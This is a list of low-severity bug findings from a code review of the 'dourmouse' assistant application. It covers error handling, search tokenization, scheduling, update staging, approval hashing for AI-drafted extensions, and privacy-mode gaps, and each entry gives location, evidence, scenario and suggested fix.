### P4-31 [low] undo() performs real moves inside one SQLite transaction and does not catch move errors, so a failure leaves moved files marked as not undone
- where: dourmouse/librarian.py:328-345
- problem: `shutil.move(dst, src)` can raise OSError (permissions, cross-volume copy failing); it is not caught, the exception propagates through `with self._conn()` and rolls back every `UPDATE moves SET undone=1` already issued in the loop although those files were moved back.
- evidence: `shutil.move(dst, src)` then `c.execute("UPDATE moves SET undone=1 WHERE id=?", (mid,))` inside a single `with self._conn() as c:`
- scenario: undo of a 50-file proposal fails at file 30; the first 29 are restored on disk but still recorded `undone=0`, a retry reports each as "something new is there now", and the librarian_undo tool returns an exception instead of a result.
- fix: catch OSError per file, commit after each successful move.

### P4-34 [low] A non-object JSON line (for example an array) crashes McpBridgeServer.serve_forever
- where: dourmouse/mcp_bridge.py:225-229
- problem: `_handle_message` calls `message.get("method")` before its try block, and serve_forever only guards `json.loads`. A valid JSON line that is not an object raises AttributeError out of the loop and kills the stdio server (reproduced with the line `[1]`: "AttributeError 'list' object has no attribute 'get'"), after which every Dourmouse tool disappears for the CLI session.
- evidence: `method = message.get("method")`
- scenario: a client that sends a JSON-RPC batch array (allowed by some MCP versions) or any stray JSON value takes the bridge down.
- fix: reject non-dict messages with a -32600 error (and iterate batch arrays) inside the guarded section.

### P4-38 [low] _fts_query keeps only ASCII letters and digits, so accented and non-Latin queries lose characters or return nothing
- where: dourmouse/memory_store.py:454
- problem: `re.split(r"[^A-Za-z0-9_]+", query)` splits on every non-ASCII letter. FTS5's unicode61 tokenizer indexes "café" as the single token `cafe`, but the query becomes `"caf"`, which does not match; a query written in Japanese, Arabic, Cyrillic etc. yields no terms and search() silently returns [] (verified: `_fts_query('日本語') == ''`).
- evidence: `terms = [t for t in re.split(r"[^A-Za-z0-9_]+", query) if t]`
- scenario: the owner asks the memory agent about a person or place with an accented name, or stores notes in another language; recall never finds them, indistinguishable from "nothing stored".
- fix: split with `re.findall(r"\w+", query, re.UNICODE)` (the tokenizer's own notion of a token).

### P4-41 [low] NodeClient and network_status let malformed node responses escape as raw ValueError/KeyError instead of NodeUnavailable
- where: dourmouse/nodes/client.py:45-53, 84-92, 155-170
- problem: `_json` calls `json.loads(data)` on both success and error bodies, so an HTML 502/504 page from a proxy or a half-written reply raises JSONDecodeError (a ValueError) rather than NodeUnavailable; `load_registry` raises KeyError when an entry lacks `url` or `token`. `network_status` catches only NodeUnavailable, so one node returning a non-JSON health reply (or a bad registry entry) aborts the whole status listing instead of marking that node offline.
- evidence: `detail = json.loads(data).get("error", "") if data else ""` and `except NodeUnavailable as exc:` around `NodeClient(info, timeout=5).health()`
- scenario: a node behind a proxy returns an HTML error page; the Network status call raises, and no node (including healthy ones) is reported.
- fix: wrap decoding in try/except ValueError raising NodeUnavailable, validate registry entries, and catch Exception per node in network_status.

### P4-42 [low] AGENTSMITH approve binds the owner's hash to the module text only, although the draft's test source is executed too and is shown to the owner as part of the review
- where: dourmouse/os_api/agentsmith.py:146-151 (executed in dourmouse/self_extensions.py:482)
- problem: the module docstring says the owner "approves the bytes they read" and the draft endpoint returns `test_source` for review, but `approve` compares `sha256` only against `_sha(preview)` (the rendered module). `self_extensions.approve` then writes and runs the draft's `test_source` in a subprocess with the server's privileges. A change to `test_source` (or its size staying under the limit) after the owner opened the draft is not detected.
- evidence: `if _sha(preview) != sha:`
- scenario: the owner reads module M and test T1; the draft record is rewritten to T2 before the click; approval proceeds, executing T2 (any code) although the hash matched.
- fix: hash module text plus test source (and schema) together in `preview_sha256`, and compare that on approve.

### P4-45 [low] apply_unified_diff silently applies a hunk to the first matching context when the stated line number does not match, unlike the SEARCH/REPLACE path which refuses ambiguity
- where: dourmouse/patch_apply.py:186-191, 214-227
- problem: when the claimed line fails, `_find_hunk_position` scans for the first exact match of `old_lines`; if the context occurs several times it picks the first one without checking uniqueness (the module docstring promises the same "uniqueness discipline" as edit_file for SEARCH/REPLACE). Hunk positions are all computed against the original lines and applied back to front, so two hunks resolving to overlapping ranges are both applied and splice into each other.
- evidence: `for i in range(0, len(file_lines) - n + 1): if file_lines[i:i + n] == hunk.old_lines: return i`
- scenario: a diff whose line numbers are off by a few lines against a file with repeated boilerplate (two identical `return None` blocks) patches the first block, not the one the model meant.
- fix: when falling back to the scan, require exactly one match (otherwise refuse), and reject overlapping hunk ranges.

### P4-47 [low] iter_source_files enumerates the entire tree (including node_modules and .git) before filtering and applying max_files
- where: dourmouse/repo_map.py:178-199
- problem: `sorted(root.rglob("*"))` materializes and sorts every path under the root, including all files inside skipped directories, and only then filters; the `max_files` cap does nothing to bound that work.
- evidence: `for p in sorted(root.rglob("*")):`
- scenario: mapping a repo that contains electron/node_modules (hundreds of thousands of files) stalls the tool for a long time and allocates every path before returning.
- fix: use `os.walk` with `dirnames[:] = [...]` pruning, as repo_index._collect_files does.

### P4-49 [low] Changelog sections with the same "## heading" overwrite each other under one title, and the later one is skipped as "unchanged"
- where: dourmouse/repo_index.py:190-207, 253-262
- problem: section titles are `<file>: <heading>`; two sections that share a heading (for example repeated "## Fixed" or "## Notes" blocks) get the same (source, title). The first is stored; for the second `store.get` returns the just-written fact whose body starts with the same META line, so it is counted `unchanged` and never stored (and on later scans one of them can overwrite the other).
- evidence: `if existing is not None and existing["body"].startswith(meta): stats["unchanged"] += 1`
- scenario: a CHANGELOG with several `## Fixed` blocks indexes only the first; a question about a decision recorded in a later one finds nothing.
- fix: include the section index (or a short hash of the body) in the title.

### P4-5 [low] bulk_ingest checkpoint and status are written only on files that reach the bottom of the loop
- where: dourmouse/bulk_ingest.py:172-220, 319-368
- problem: `if stats["scanned"] % status_every == 0` sits after the `continue` statements for no-text, duplicate and error-read files. If the 200th (or 400th...) scanned file is skipped, the periodic save does not run until the next multiple that happens to be stored.
- evidence: `if stats["scanned"] % status_every == 0:`
- scenario: a home directory where most files are media or binary (most are no-text skips) writes the checkpoint rarely; a killed run re-does most of the walk although the docstring promises "a killed/resumed run never re-does completed work".
- fix: save when `stats["scanned"] - last_saved >= status_every` at the top of the loop (or in a finally per item).

### P4-50 [low] scan_repo's prune step calls store.all_facts() and store.delete() on LocalFallbackMemoryStore, which reads a different store than the one written and lacks delete
- where: dourmouse/repo_index.py:256-285 (with memory_store.py:666-778)
- problem: with DOURMOUSE_MEMORY_REMOTE_URL set, open_repo_store returns a LocalFallbackMemoryStore. `remember`/`get` go to the remote, but `all_facts()` always raises on the remote and returns the LOCAL store's facts, so removed files are never pruned from the remote; and any local fact that does match a prune case (for example a "[PENDING SYNC] <title>" fact written during an outage, whose title is not in `produced`) leads to `store.delete(...)`, which LocalFallbackMemoryStore does not define, raising AttributeError out of the tool after the ingest has already happened.
- evidence: `if store.delete(source, fact["title"]):`
- scenario: after a network blip left PENDING SYNC repo facts locally, the next atlas_repo_scan fails with AttributeError mid-prune; on a healthy remote, deleted source files stay in the shared index forever.
- fix: add delete (and the other missing methods) to LocalFallbackMemoryStore, and make prune operate on the same backing store that scan wrote to.

### P4-56 [low] check_ip_reputation and run_self_audit can raise despite "never raises" and have no timeout on git
- where: dourmouse/security/reputation.py:77-89; dourmouse/security/self_audit.py:70-79, 90-95
- problem: reputation: only HTTPError, URLError and TimeoutError are caught; a ConnectionResetError/ssl.SSLError raised while reading the body, or a JSON body that is not an object (`json.loads(raw).get` on a list) raises out of a function documented "Never raises". self_audit: `check_env_tracked` runs `git` with no timeout and without handling FileNotFoundError, and `check_helper` calls `_sha(installed)` (PermissionError if the root-owned helper is unreadable) so one failing check aborts the whole self audit.
- evidence: `payload = json.loads(raw).get("data") or {}`
- scenario: AbuseIPDB resets the connection mid-response, the caller of the reputation lookup (the sentry scan) gets an exception instead of `{"available": False}`; or git is missing from PATH in the packaged app and the self-audit panel fails entirely.
- fix: catch OSError and ValueError/AttributeError in reputation, and wrap each audit check so a failure becomes a finding ("check could not run").

### P4-58 [low] open_incident refuses to open a case for a fingerprint that has a closed one, contradicting the documented "open a NEW incident for a recurrence" workflow
- where: dourmouse/security/sentry.py:433-456, 458-485 (module docstring lines 51-62)
- problem: `incidents.fingerprint` is the primary key and `open_incident` returns "already_open" for any existing row regardless of status, while `update_incident` refuses any transition away from RESOLVED/ACCEPTED_RISK ("terminal"). The docstring promises that a closed case is never reopened and that "a real analyst opens a NEW incident for a genuine recurrence", but there is no path to do so for the same finding.
- evidence: `if existing is not None: return "already_open"`
- scenario: an exposed-port finding is RESOLVED; the service is exposed again a month later; the operator cannot track it: open says "already_open" (misleading, the case is closed) and update says "terminal".
- fix: key incidents on an autoincrement id (fingerprint indexed), and let open_incident create a new row when the latest one is terminal.

### P4-59 [low] TradingView signals are posted to the bus with to_agent="BROADCAST", but the bus's broadcast address is "*", so no agent ever receives them
- where: dourmouse/tradingview_ops.py:189-196 (same mismatch in webui.py:5150, outside this group)
- problem: `message_bus.BROADCAST` is `"*"` and `inbox()`/`unread_count()` match `m["to"] in (agent, "*")`. `bus.post("tradingview", "BROADCAST", ...)` creates a message addressed to an agent literally named "BROADCAST", which nobody reads; it only appears in the global snapshot the HUD panel shows. The module docstring promises an "AGENT COMMS bus broadcast".
- evidence: `bus.post("tradingview", "BROADCAST", f"TV {act.upper()}", ...)`
- scenario: a TradingView alert fires; the HUD shows it, but the markets/atlas agents' inboxes and unread badges never include it, so a chat turn asking an agent to "check new signals" via read_inbox finds nothing.
- fix: import and use `message_bus.BROADCAST` ("*").

### P4-61 [low] audit_tokens silently skips text tokens that are missing or unparseable, the failure mode its own extract_tokens docstring calls dangerous
- where: dourmouse/ui_contrast.py:105-122, 187-197
- problem: when `tokens.get(token)` is absent or `parse_color` returns None (an unresolved `var()`, `hsl()`, `color-mix()`, a percent alpha), the loop `continue`s without a row or an error, and a missing ground token is dropped the same way. A CSS change that renames or restyles `--text` therefore yields no rows at all and no failing check. (Separately `rgba(0,0,0,50%)` is parsed as alpha 50, clamped to 1.0 and treated as opaque.)
- evidence: `if not fg: continue`
- scenario: the UI refactor changes `--text-dim` to `hsl(210 10% 60%)`; the contrast test still passes with zero rows for that token, so a regression ships unchecked.
- fix: emit a row (or raise) with passes=False/"unparsed" for any configured token that is missing or cannot be parsed, and treat `%` alpha as a fraction.

### P4-63 [low] worldmonitor_catalog raises IndexError for a tool whose description is only whitespace
- where: dourmouse/worldmonitor.py:182
- problem: `(t.get("description") or "").strip().splitlines()[0] if t.get("description") else ""` tests the raw string for truthiness, then strips it; `"   ".strip().splitlines()` is `[]`, so `[0]` raises IndexError. It is outside the try/except that converts SDK errors, so the status and catalog tools crash instead of reporting honestly.
- evidence: `desc = (t.get("description") or "").strip().splitlines()[0] if t.get("description") else ""`
- scenario: one catalog entry with a blank description makes worldmonitor_catalog and worldmonitor_call_tool (through _is_known_tool, which only catches WorldMonitorNotAvailable) raise.
- fix: strip first, then split with a default (`(text.splitlines() or [""])[0]`).

### P4-64 [low] Update feed: DOURMOUSE_UPDATE_CHANNEL does not filter anything, and the staged file name is built from the unvalidated feed version with a `.part` name that drops the last version component
- where: dourmouse/updates.py:122-147, 229, 240
- problem: (a) `_validate_feed` accepts whatever allowed `channel` the feed states and `check_for_updates` returns it, so a user configured for `stable` is offered a `beta` release; the env setting is only a default. (b) `version` is only checked for non-emptiness yet becomes part of the path (`root / f"dourmouse-{version}"`). (c) `dest.with_suffix(".part")` replaces the last dotted component of the version, so `dourmouse-5.20.1` stages through `dourmouse-5.20.part`, a name shared by every patch release of that minor version.
- evidence: `tmp = dest.with_suffix(".part")` and `channel = str(data.get("channel") or update_channel()).strip().lower()`
- scenario: a beta feed entry is surfaced to a stable-channel install; two stagings of 5.20.1 and 5.20.2 (retry, or two requests) write the same .part file and one can promote the other's partial bytes (the hash check then rejects it, so the update fails).
- fix: reject a feed channel that differs from the configured one, restrict `version` to `[0-9A-Za-z._-]`, and use `dest.with_name(dest.name + ".part")`.

### P4-65 [low] usage_tracker claims atomic writes but rewrites usage.json in place, and one null field in a usage report drops the whole record
- where: dourmouse/usage_tracker.py:56-78, 87-98, 105-114
- problem: `_save` is a plain `write_text` (truncate then write) and `_LOAD` treats an unreadable file as "nothing recorded", so a crash mid-write (or a second process, such as the Electron shell's server and a CLI, writing at once) silently resets the persisted totals to zero. Also `int(usage.get("input_tokens", 0))` / `float(usage.get("cost_usd", 0.0))` raise TypeError when the CLI reports `null`, and the blanket `except Exception: pass` then discards the entire call's count (requests, cost and tokens), although the module promises that every real call is counted.
- evidence: `path.write_text(json.dumps(totals, indent=2), encoding="utf-8")`
- scenario: a Claude result event with `cache_read_input_tokens: null` is never counted; the usage bar under-reports permanently, and a kill during a write zeroes the lifetime total.
- fix: coerce with `int(x or 0)`, and write via temp file plus os.replace (with a cross-process lock if two processes share the file).

### P4-67 [low] atlas_lab run directories (generated harness.py and strategy_module.py) are never removed, and each harness hardcodes the absolute path of its own directory
- where: dourmouse/workspace/atlas_lab/tmp/run_*/harness.py:3 (created by atlas_proposals.py:677-686)
- problem: `_execute` creates `.../atlas_lab/tmp/<run id>/`, writes the model-authored strategy and a harness whose first lines are `sys.path.insert(0, '/Users/aditagrawal/.../run_...')`, runs it, and returns without deleting the directory. Every run, including test runs ("note": "test" no-op strategies, identical across 13 of the files here, md5 c4cb16...), leaves two files plus __pycache__ behind forever; the files embed the local user name and checkout path.
- evidence: `sys.path.insert(0, '/Users/aditagrawal/dourmouse-recon/dourmouse/workspace/atlas_lab/tmp/run_20261005_070222_7e66ae')`
- scenario: months of lab use accumulate unreviewed AI-written code that a later `sys.path`/glob based loader or backup could pick up, and the workspace grows without bound; tests that run without DOURMOUSE_WORKSPACE write into the source tree (the files sit under dourmouse/workspace).
- fix: delete the run directory in a finally block (keep the metrics in proposals.json) and have tests set DOURMOUSE_WORKSPACE.

### P4-7 [low] Local ingest reads whole files into memory before applying the 200k cap, and read/store errors are checkpointed as done
- where: dourmouse/bulk_ingest.py:105-110, 178-215
- problem: `path.read_text()` loads the entire file (any extension-less file or listed extension, including multi-GB logs or binaries without a suffix) and only then slices `[:_MAX_TEXT_CHARS]`; the comment claims the cap stops a giant file from blowing up. Also on a read or `store.remember` exception the key is still added to `done`, so a transient SQLite lock permanently drops that file.
- evidence: `return path.read_text(encoding="utf-8", errors="replace")`
- scenario: a large extension-less binary under the home directory (VM image, core dump) allocates GBs while walking; a `database is locked` error during one remember() call leaves that file unindexed forever.
- fix: stat the size first or read a bounded prefix (`open().read(_MAX_TEXT_CHARS*4)`), and do not add to `done` on exceptions.

### P5-10 [low] Memorial Day computed as the 5th Monday of May, which lands in June in many years
- where: dourmouse/atlas/atlas_scheduler.py:91
- problem: comment says "last Mon May" but code is nth_weekday(year, 5, 0, 5); when May has only four Mondays the result spills into June (2025 -> 2025-06-02, 2026 -> 2026-06-01, 2029 -> 2029-06-04), so the real holiday is missed and a June weekday is wrongly excluded.
- evidence: `nth_weekday(year, 5, 0, 5),            # Memorial Day (last Mon May)`
- scenario: latent for the current legs (months 4, 8, 12) but any leg added for May/June gets a wrong open/close day; first_trading_day(2025, 6) skips a real trading day.
- fix: compute the last Monday of May (date(y,5,31) minus (weekday) days).

### P5-12 [low] Frame-bust regexes have no word boundaries and rewrite the whole HTML
- where: dourmouse/browser_pane.py:196-197, 188-191
- problem: `top\.location`, `parent\.location` and `top\s*!=\s*self` are applied to the entire document bytes with no leading boundary, so identifiers and text such as `desktop.location`, `laptop.location`, `grandparent.location` or `laptop != selfie` are rewritten into broken code/text (`desself.location`).
- evidence: `(rb"top\.location", b"self.location"),`
- scenario: a proxied page whose script reads `desktop.location` or whose copy mentions "laptop.location" breaks or shows garbled text.
- fix: prefix with (?<![\w$.]) and apply only inside <script> bodies.

### P5-14 [low] device_wiki_scan accepts a negative max_files_to_summarize
- where: dourmouse/device_wiki_tools.py:50, 64
- problem: the "named cost bound" is never validated; a negative value makes `new_or_changed[:max_files]` slice from the end (e.g. -1 = all but one file), defeating the bound the docstring promises.
- evidence: `for path in new_or_changed[:max_files]:`
- scenario: model passes max_files_to_summarize=-1 on a large first scan -> one model call per file for thousands of files.
- fix: `max_files = max(0, min(max_files, hard_cap))`.

### P5-16 [low] Encrypted PDFs raise out of extract_pdf_text instead of returning "PDF READ FAILED"
- where: dourmouse/extract.py:39-53
- problem: only the PdfReader() constructor is inside the try (comment: "encrypted/corrupt PDFs, honest"); with pypdf an encrypted file constructs fine and `reader.pages` raises FileNotDecryptedError at line 53, uncaught.
- evidence: `for i, page in enumerate(reader.pages, 1):`
- scenario: user uploads a password-protected invoice -> tool call crashes with an exception instead of the honest message.
- fix: move the page loop inside the try, or check reader.is_encrypted first.

### P5-17 [low] Gemini transport only wraps connection-phase errors; mid-stream failures escape raw and the "wall-clock" timeout is a per-read idle timeout
- where: dourmouse/gemini_backend.py:357-376 (docs at 95-102, 564-569)
- problem: the docstring promises every HTTP/network/timeout failure becomes a RuntimeError and calls the timeout a wall-clock budget. The `for raw in resp` loop is outside the try, so socket.timeout/TimeoutError, ConnectionResetError, http.client.IncompleteRead raised while streaming propagate unwrapped (losing the partial text already delivered), and urlopen's timeout bounds each socket read, not the whole generation.
- evidence: `with resp:` / `for raw in resp:` after the try block
- scenario: Wi-Fi drops 60s into a stream -> raw ConnectionResetError/IncompleteRead reaches callers that only catch RuntimeError; a trickling server can hold the call far beyond 300s.
- fix: wrap the read loop in the same except clauses and enforce a monotonic deadline.

### P5-20 [low] One wrong-dimension vector makes every GlobalMemory.search raise, silently disabling memory
- where: dourmouse/global_memory.py:136-143, 259-264 (caller dispatch.py:5100-5104)
- problem: cosine_similarity does np.dot on arrays of different length, which raises ValueError. search() only skips rows that fail json.loads; add(vector=...) never checks the dimension (only ingest_corpus_file's validate does, against the EMBED_DIM env constant rather than the model's real output). After a change of DOURMOUSE_EMBED_MODEL, or one mis-sized pre-embedded vector, every query raises and dispatch swallows it with `except Exception`, so retrieval returns "" forever with no warning.
- evidence: `score = cosine_similarity(qvec, vec)`
- scenario: user switches embedding model; all old rows have 768 dims, the new query has 1024; auto-injected memory silently stops working.
- fix: skip (and count/log) rows whose len(vec) != len(qvec), and validate dimension in add().

### P5-21 [low] goal_events/export return the OLDEST N events, so a long goal's snapshot never shows what it is doing now
- where: dourmouse/goals.py:524-530 (used by goal_snapshot at 546 and export_events_markdown at 591)
- problem: `ORDER BY id ASC LIMIT ?` keeps the first `limit` rows (200 in goal_snapshot, 500 in export). Once a goal logs more events than that (every task/status/tool event counts) the newest events are silently dropped; all_events() in the same class correctly uses DESC, so the two disagree.
- evidence: `"SELECT * FROM goal_events WHERE goal_id=? ORDER BY id ASC LIMIT ?"`
- scenario: a long-running goal with 300 events: the inspector pane and the audit export end at event 200/500 and never show the current task, the failure, or the final verdict.
- fix: select the newest N (ORDER BY id DESC LIMIT ?) and reverse them in Python.

### P5-22 [low] update_goal_status has no terminal-state guard; a stale-snapshot writer can resurrect a cancelled goal
- where: dourmouse/goals.py:253-257 (writer: dourmouse/goal_runtime.py:542, 197-199)
- problem: the UPDATE is unconditional unless the goal is PAUSED, so COMPLETED/BLOCKED/EXECUTING can overwrite CANCELLED/FAILED/EXPIRED. cancel_goal's docstring says mid-flight work is safe because the worker re-checks, but the tick resolves terminal shape from a goal/tasks snapshot read before the loop (`_resolve_if_terminal(goal, tasks)` -> `_complete_goal` -> `update_goal_status(goal_id, "COMPLETED")` with no re-read on the criteria-less path).
- evidence: `"UPDATE goals SET status=?, blocked_reason=?, result=COALESCE(?, result),"`
- scenario: user cancels between the tick's list_tasks and the final write: the goal flips CANCELLED -> COMPLETED and a "Done" notification is sent.
- fix: add `AND status NOT IN (terminal)` to the non-held UPDATE (unless explicitly forced).

### P5-25 [low] _last_session_record gives up on the whole session if any single line is corrupt
- where: dourmouse/learn.py:224-233
- problem: one json.loads failure (e.g. a truncated final line after a crash) aborts the loop and returns None, so record_feedback reports "no completed turn found" although earlier turns are intact. It also assumes every parsed line is a dict.
- evidence: `except (json.JSONDecodeError, OSError):` wrapping the whole loop
- scenario: crash mid-append leaves a partial last line; thumbs-up/down feedback silently stops working for that session.
- fix: try/except per line and skip bad lines.

### P5-29 [low] Audio files with embedded cover art are planned as video and transcoded with libx264
- where: dourmouse/media_convert.py:88, 104-111
- problem: probe counts an attached picture (mjpeg/png) as a "Video" stream, so plan() takes the video branch for .flac/.wma/.ape/.alac files with cover art, re-encodes the art with libx264 -pix_fmt yuv420p (which fails on odd dimensions) and outputs video/mp4 instead of an .m4a.
- evidence: `has_video = bool(info["video"])`
- scenario: a FLAC with 501x501 cover art fails to convert with an x264 "not divisible by 2" error; one with even dimensions yields a pointless video re-encode.
- fix: ignore streams flagged "(attached pic)" (or codec mjpeg/png/bmp) when deciding has_video.

### P5-34 [low] Job code is launched with preexec_fn from a multi-threaded server
- where: dourmouse/nodes/node_server.py:388-398
- problem: subprocess docs state preexec_fn is not safe in the presence of threads (deadlock if another thread holds an interpreter/allocator lock at fork). The node runs one handler thread per request plus env-probe, watchdog and disk-guard threads, and jobs are started concurrently.
- evidence: `kwargs["preexec_fn"] = _limits`
- scenario: two job submissions at once: occasionally the forked child hangs before exec, the job sits "running" until timeout_s with no output.
- fix: apply the limits by exec'ing a tiny launcher (e.g. `python -c` that calls setrlimit then os.execv) or use `process_group`/`resource` wrappers instead of preexec_fn.

### P5-35 [low] Job-controlled metrics.json is read into memory with no size cap
- where: dourmouse/nodes/node_server.py:476-482
- problem: after the job ends, `metrics_file.read_text()` + json.loads load the whole file; the job may write up to RLIMIT_FSIZE (1 GiB) there, so the node process reads and parses up to a gigabyte, while stdout is carefully tail-read.
- evidence: `metrics = json.loads(metrics_file.read_text(encoding="utf-8"))`
- scenario: a runaway/buggy job writes a huge out/metrics.json; the node service balloons in memory or is OOM-killed, taking every other job's bookkeeping with it.
- fix: stat the file and refuse (record an _error) above e.g. 1 MiB.

### P5-36 [low] orchestrator.dispatch lets a malformed tool call crash the loop instead of returning an error tool result
- where: dourmouse/orchestrator.py:139-146 (callee dourmouse/research_agent.py:216)
- problem: arguments come from the model; json.loads may yield a non-dict, and call_research_tool does `arguments["symbols"]` (KeyError when the model omits it). Only JSONDecodeError is handled, so any other exception from the handler aborts the whole dispatch with a raw traceback, unlike the "unknown tool"/"invalid JSON" cases which are fed back to the model.
- evidence: `result_text = handler(arguments)`
- scenario: the model calls run_atlas_research with {} -> KeyError: 'symbols' escapes dispatch().
- fix: wrap the handler call in try/except Exception and return an "ERROR: ..." tool result; check isinstance(arguments, dict).

### P5-37 [low] POST /api/os/apps/allow with only a bundle id can adopt the name of an unrelated running app
- where: dourmouse/os_api/apps.py:72-85
- problem: `name` may be empty when only `bundle_id` is sent, and the running-app lookup tests `name.casefold() in (running_name, running_bundle_id)`. An empty name equals the empty bundle id of any running app that has none (unbundled helpers, or the osascript backend when bundleIdentifier() failed), so the first such app wins and its name replaces `name` in the stored entry.
- evidence: `if name.casefold() in (str(running.get("name") or "").casefold(), str(running.get("bundle_id") or "").casefold()):`
- scenario: owner allows "com.example.Foo" by bundle id while any unbundled app is running: the allow entry is stored as {name: <that other app>, bundle_id: com.example.Foo}; where the other app's bundle id is unknown, policy._matches falls back to the name and allows it.
- fix: skip the lookup when name is empty and match the bundle id only against a non-empty bundle_id.

### P5-4 [low] _run_backend_slash only catches RuntimeError
- where: dourmouse/all_hands.py:479-486
- problem: `/claude`, `/nvidia` etc. call _default_brain, which can raise non-RuntimeError (ValueError from missing "task" paths, OSError from subprocess, KeyError from load_backend config) and these propagate out of run_slash to the HTTP handler instead of returning {ok: False, text}. The /all path (_run_brain) catches Exception, so the two paths disagree.
- evidence: `except RuntimeError as exc:`
- scenario: a malformed backend env/config raising ValueError makes the slash command 500 rather than an honest error card.
- fix: catch Exception here like _run_brain does.

### P5-41 [low] The first _report_time() call in the reporter thread is unguarded
- where: dourmouse/report.py:245
- problem: the loop re-reads and tolerates a bad DOURMOUSE_REPORT_TIME (lines 249-253), but the initial `target = _report_time()` before the loop raises ValueError out of the thread on a bad value, so the daemon dies silently (running becomes False, schedule_brief_on_open returns None).
- evidence: `target = _report_time()` as the first statement of _loop
- scenario: `DOURMOUSE_REPORT_TIME=8.30` in .env: no scheduled briefing and no launch briefing, with no log line.
- fix: delete the pre-loop read (the loop already assigns target) or wrap it in the same try/except.

### P5-42 [low] call_research_tool does not handle the subprocess timeout or missing arguments
- where: dourmouse/research_agent.py:156-164, 216-231
- problem: run_atlas_research uses subprocess.run(timeout=900), whose TimeoutExpired is a SubprocessError, not a RuntimeError, so call_research_tool's `except RuntimeError` misses it and the "reported honestly" contract breaks; `arguments["symbols"]` raises KeyError when the model omits it. (atlas_cli._format_cli_run handles TimeoutExpired for the same kind of call.)
- evidence: `except RuntimeError as exc:` is the last handler; no `subprocess.TimeoutExpired`
- scenario: a long ATLAS research run (more symbols/generations) exceeds 900s: the exception escapes the tool handler instead of an "ATLAS RUN FAILED: timed out" result.
- fix: catch subprocess.TimeoutExpired (and KeyError/TypeError) in call_research_tool and return honest text.

### P5-49 [low] "every <weekday>s" is documented but rejected
- where: dourmouse/schedules.py:114-115 (docstring lines 10-11)
- problem: the regex `every\s+([a-z]+)s?` is greedy, so for "every mondays" group 1 is "mondays", which is not in _WEEKDAYS, and the phrase falls through to "schedule not understood". Verified: "every mondays" and "every fridays at 2pm" raise; "every Monday" works. The docstring advertises `every <weekday>[s]`.
- evidence: `m = re.fullmatch(r"every\s+([a-z]+)s?\s*(?:at\s+(.+))?", s)`
- scenario: user says "every Fridays at 2pm" and the routine is refused.
- fix: strip a trailing "s" when the plain word is not a weekday (or use `([a-z]+?)s?` with end anchoring).

### P5-50 [low] Baseline "gone" persistence anomalies are produced but never reported
- where: dourmouse/security/baseline.py:107-126 and dourmouse/security/mac_detectors.py:155-172
- problem: compare() deliberately emits Anomaly("gone") for persistence items ("a removed persistence item is worth knowing"), but _changes() only handles a.kind == "new" and "changed" for persistence, so removals are dropped. Also listening_port anomalies of kind "changed" (exposure changed, e.g. loopback -> all interfaces) are rendered with the text "This port was not open before", which is false for a changed exposure.
- evidence: `elif o.category == "persistence":` ... `if a.kind == "new":` / `elif a.kind == "changed":` (no gone branch)
- scenario: a LaunchAgent is deleted by malware cleanup or tampering: no finding; a dev server moves from 127.0.0.1 to 0.0.0.0 and is described as a newly opened port.
- fix: add a "gone" finding and distinguish new from changed in the listening_port text.

### P5-54 [low] Privacy mode does not withhold security_self_audit or lockdown_status output from the cloud chat model
- where: dourmouse/security/tools.py:573-577 (EVIDENCE_TOOLS), 545-556, 269-272
- problem: privacy.py promises that in privacy mode "every chat tool that returns evidence" answers with a withheld note. The allowlist omits security_self_audit (findings with file paths, .env/git and key-permission details about this Mac) and lockdown_status (the owner's blocked apps and sites), so their output still goes to the cloud model.
- evidence: `EVIDENCE_TOOLS = frozenset({"security_status", ..., "security_quarantine_list"})` without those two names
- scenario: privacy mode on, user asks "audit yourself": findings and paths are returned into the cloud conversation.
- fix: add them to EVIDENCE_TOOLS (or make the set derived from a per-spec flag so new tools default to withheld).

### P5-56 [low] build_semantic_graph can raise despite its "never raises" contract
- where: dourmouse/semantic_graph.py:153-166
- problem: `dim = len(next(iter(vectors.values())))` takes the first dict value, which can be None/empty for a fact whose embedding failed (usable only filters later), raising TypeError; the collection recreate/upsert block has only a finally, so a Qdrant local-lock error ("already accessed by another instance", easy with two concurrent requests) also propagates.
- evidence: `dim = len(next(iter(vectors.values())))`
- scenario: one fact fails to embed and happens to be first, or two graph requests overlap: the endpoint returns a 500 instead of {"ok": False, "error": ...}.
- fix: take dim from `len(vectors[usable[0]["id"]])` and wrap the Qdrant section in try/except returning an error dict.

### P5-57 [low] Settings writes create the credentials file with default permissions before chmod 0600
- where: dourmouse/settings_registry.py:128-155
- problem: both writers do `path.write_text(...)` then `path.chmod(0o600)`. When the file does not yet exist it is created with umask permissions (usually 0644) and holds API keys until the chmod, and read-modify-write is unlocked so two concurrent saves lose one change. (Paths are also joined with os.pathsep, so a folder name containing ":" splits into two bogus entries on read.)
- evidence: `path.write_text("\n".join(body) + "\n", encoding="utf-8")` / `path.chmod(0o600)`
- scenario: first Settings save on a fresh profile: another local user can read the file in the gap.
- fix: create with os.open(..., 0o600) via a temp file and os.replace (privacy.atomic_write_text already does this), under a lock.

### P5-59 [low] Vault scores are min-max normalised per query, so a lone hit scores 0.0 (or 1.0) and the top vault hit always outranks local hits
- where: dourmouse/shared_rag.py:469-476, 545
- problem: with one hit span falls back to 1.0 and norm = 0, giving score 0.0 on higher-is-better metrics but 1.0 on L2 metrics; with several hits the best always gets 1.0 and the worst 0.0 regardless of true similarity. These synthetic scores are then sorted together with true cosine scores from the local store.
- evidence: `h["score"] = (1.0 - norm) if lower_is_better else norm`
- scenario: a genuinely good single vault match ranks last (0.00) behind weak local hits; a poor top vault match shows score 1.00 and displaces a 0.9 local hit.
- fix: normalise by metric semantics (cosine/IP on unit vectors, or exp(-d)) rather than within the result set, or keep the sources in separate ranked lists.

### P5-60 [low] supabase_sync is never constructed outside tests, its default outbox path is the current directory, and push marks server-skipped rows as synced
- where: dourmouse/supabase_sync.py:417, 543-545
- problem: (1) no non-test code instantiates SupabaseSync (grep finds none), so the "local-first sync" described in the docstring does not exist at runtime. (2) When it is used with the default `outbox_path`, the outbox is `Path.cwd() / "supabase_outbox.db"`: an app launched from Finder/Electron with cwd "/" raises sqlite OperationalError from the constructor (the docstring promises construction never raises), and different launch directories get different queues. (3) push() clears the whole batch and calls mark_synced with the LOCAL body for rows the server skipped; for a same-second tie with a different body the cloud keeps its version, local keeps its own, both are recorded as in sync, pull skips (not strictly newer) and queue_all_local never re-queues, so the two silently diverge.
- evidence: `self.outbox = SyncOutbox(outbox_path or Path.cwd() / _DEFAULT_OUTBOX_NAME)`
- scenario: wiring the module in as-is: Finder launch fails at construction; two devices editing the same fact within one second diverge permanently.
